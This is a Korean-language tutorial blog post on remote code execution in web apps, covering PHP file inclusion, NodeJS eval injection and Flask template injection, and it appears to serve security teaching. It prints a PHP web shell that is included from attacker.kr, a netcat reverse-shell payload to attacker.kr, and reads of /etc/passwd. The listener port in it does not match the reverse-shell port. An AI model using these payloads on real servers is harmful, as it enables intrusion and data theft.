---
emoji: 📣
title: Web Application RCE Case
author: Zer0Luck
date: '2021-12-25 05:00:00'
categories: Web
tags: RCE tutorial
---

# QuickStart
## Web Application RCE Case

### PHP
- File Inclusion, File upload, ...

### NodeJS
- Code Injection, Unserialize, ...

### Flask
- Server Side Template Injection, ...

## RCE Case1 #PHP

### File Inclusion
- php `include` 키워드는 `text/code/markup` 형식의 파일을 읽어와 php 파일의 내용을 다른 PHP 파일에 삽입할 수 있다.
```php
<?php
    include $_GET[file];
?>
```
- 예시로 공격 대상 서버에 `include`가 가능한 경우 RCE가 가능한 페이로드를 업로드하여 호출함으로 써 공격이 가능해진다.
**request**
```php
# > https://victim.kr/index.php?file=https://attacker.kr/payload.txt&cmd=id
```

**payload.txt**
```php
<?php
    echo shell_exec($_GET[cmd]);
?>
```

**response**
```php
uid=20080 gid=1001 groups=1001
```
- 공격자의 `payload` 데이터를 include 하였기 때문에 원하는 방향으로 수행할 수 있는 구조가 생긴다.
### File Inclusion technique

#### 맛있는 `include` 할 대상 파일
- `/etc/passwd` : 리눅스 계정 목록 [Local File]
- `/proc/self/maps` : 프로그램 메모리 덩보 [Local File]
- `/var/www/html/[payload.*]` : 코드를 실행할 수 있는 php 코드 [Local File]
- `https://attacker.kr/payload.txt` : 코드를 실행할 수 있는 php 코드 [Remote File]

#### 시도 해 볼 만한 함수
- `echo "data";` : 문자 출력
- `phpinfo();` : php 정보 출력
- `system("id")` : system 명령어 수행
- `passthru("id")` : passthru 명령어 수행
- `file_put_contents("/tmp/test.txt", "data")` : 파일 쓰기(생성)
- `file_get_contents("/tmp/test.txt")` : 파일 읽기


## RCE Case2 #NodeJS

### NodeJS Code Injection
**request**
```javascript
//> http://victim.kr/api/v1/data/require("child_process").exec("nc -e /bin/sh attacker.kr 8080")
```

**attacker server**
```javascript
# nc -lvp 8888
```
- 대상 서버상 내부적으로 처리하는 구간에서 `경로`,`쿼리`등의 데이터가 내부 javascript로 해석되어 실행되는 구간이 존재하는 경우 위와 같은 공격을 이용하여 RCE이 수행이 가능

**victim.kr 내부 구현**
```javascript
...
eval(data_input); // data_input은 위의 request에서 전달받은 데이터
...
```
- 대상 서버 내부 구현은 다음과 같이 입력 된 데이터가 `eval` api를 통한 문자열이 javascript로 해석되어 실행되는 구간으로 동작하기 때문

#### NodeJS Code Injection technique

#### **fs class**
- 공격시 대상 서버의 파일을 읽는 경우 `require('fs')` 모듈을 활용하여 파일 시스템(파일 읽기, 쓰기, 삭제)을 제어할 수 있으며 다양한 방식으로 활용된다.

**readdir()**
- fs class의 `readdir()`, `readdirSync()` 메서드를 통해 대상 서버의 디렉터리 내용을 나열할 수 있다. 후자가 동기식 버전 말고는 동일하다. 
``` javascript
var fs = require('fs');
fs.readdir('.').toString('utf8');
fs.readdir('..').toString('utf8');
```

**readFile()**
- 공격자는 앞서 서버 디렉토리 구조를 파악한 후 `readFile()`, `readFileSync()` 메서드를 활용하여 파일의 내용을 읽을 수 있다.
``` javascript
var fs = require('fs');
fs.readFile('/etc/passwd').toString('utf8');
```

**Child Process**
- 공격자는 `child_process` 모듈을 사용해 Node.js 에서 작식 프로세스를 생성하여 자식 프로세스로 `spawn(), fork(), exec(), execFile()` 등의 메서드를 실행할 수 있다. 
- `spawn()` 함수는 Stream 데이터를 반환하고 `exec()` 함수는 전체 버퍼 출력을 반환한다. 

#### **Ncat**
- 공격자는 앞서 페이로드를 구성한후 자신의 서버로 대상 서버를 연결하기 위해 Revers Shell을 설정하기 위해 Ncat를 활용한다.
- 
``` javascript
// > http://victim.kr/api/v1/data/require("child_process").exec("nc -e /bin/sh attacker.kr 8080")
// < nc -lvp 8888
```

## RCE Case3 #Flask/Jinja2

### Flask Server Side Template Injection
- Server Side Template Injection을 서버에서 임의 코드를 실행 할 수 있는 사용자 입력 값에 Template keyword를 삽입해서 Tempalte Engine에서 해당 입력 값을 기반으로 데이터를 렌더링되어 실행된다.

**victim.kr 내부 서버 구현**
```python
def index():
    return render_template_string(
        '<h1>{{ request.args.get("input") }}</h1>'
    )
```

**request**
``` python
# http://victim.kr/?input={{4*4}}
```

**response**
``` python
# > <h1>16</h1>
```
- 대상 내부 서버에서는 input 쿼리 값으로 request get 요청을 통해 입력 받아 `render_template_string` 메서드를 활용해 rednering되어 출력된다. `{{4*4}}`을 입력하여 SSTI 수행 시 템플릿 엔지이 해당 식을 해석하여 `16`을 반환한다.

```toc
```